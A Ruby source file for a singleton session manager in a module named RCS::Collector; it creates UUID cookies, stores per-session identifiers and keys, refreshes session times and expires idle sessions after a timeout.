#
#  Session Manager, manages all the cookies
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'singleton'
require 'uuidtools'

module RCS
module Collector

class SessionManager
  include Singleton
  include RCS::Tracer

  def initialize
    @sessions = {}
  end

  def create(bid, build, instance, subtype, k)

    # create a new random cookie
    #cookie = SecureRandom.random_bytes(8).unpack('H*').first
    cookie = UUIDTools::UUID.random_create.to_s

    # store the sessions
    @sessions[cookie] = {:bid => bid,
                         :build => build,
                         :instance => instance,
                         :subtype => subtype,
                         :key => k,
                         :cookie => cookie,
                         :time => Time.now}

    return cookie
  end

  def check(cookie)
    return false if @sessions[cookie].nil?

    # update the time of the session (to avoid timeout)
    @sessions[cookie][:time] = Time.now

    return true
  end

  def get(cookie)
    return @sessions[cookie]
  end

  def delete(cookie)
    @sessions.delete(cookie)
  end

  def timeout(delta = 600)
    trace :debug, "Session Manager timeouting entries..." if @sessions.length > 0
    # save the size of the hash before deletion
    size = @sessions.length
    # apply the filter
    @sessions.delete_if { |key, value| Time.now - value[:time] >= delta }
    trace :info, "Session Manager timeouted #{size - @sessions.length} sessions" if size - @sessions.length > 0
  end

  def length
    return @sessions.length
  end
end #SessionManager

end #Collector::
end #RCS::